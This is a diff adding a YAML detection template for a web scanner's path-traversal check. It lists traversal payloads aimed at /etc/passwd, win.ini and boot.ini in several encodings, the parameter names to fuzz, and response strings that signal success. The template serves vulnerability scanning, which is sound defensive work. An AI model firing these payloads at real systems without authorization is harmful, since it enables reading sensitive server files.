@@ -1,0 +1,64 @@
+id: "path-traversal"
+issue_code: "path_traversal"
+detection_condition: "or"
+detection_methods:
+  - response_condition:
+      contains: "root:x:0:0:"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "[boot loader]"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "; for 16-bit app support"
+      part: body
+      confidence: 90
+launch:
+  operator: or
+  conditions:
+    - type: insertion_point_name
+      parameter_names:
+        - path
+        - file
+        - filename
+        - filepath
+        - file_path
+        - dir
+        - directory
+        - folder
+        - document
+        - doc
+        - download
+        - page
+        - template
+        - include
+        - view
+        - load
+        - read
+        - resource
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "../../../../../../../../../../etc/passwd"
+  - "....//....//....//....//....//....//....//etc/passwd"
+  - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+  - "/etc/passwd"
+  - "file:///etc/passwd"
+  - "../../../../../../../../../../etc/passwd%00"
+  - "../../../../../../../../../../windows/win.ini"
+  - "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+  - "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+  - "/../../../../../../../../boot.ini"
+  - "C:\\boot.ini"
+categories:
+  - path_traversal
+  - injection
+platforms:
+  - php
+  - java
+  - python
+  - nodejs
+  - dotnet
+  - ruby
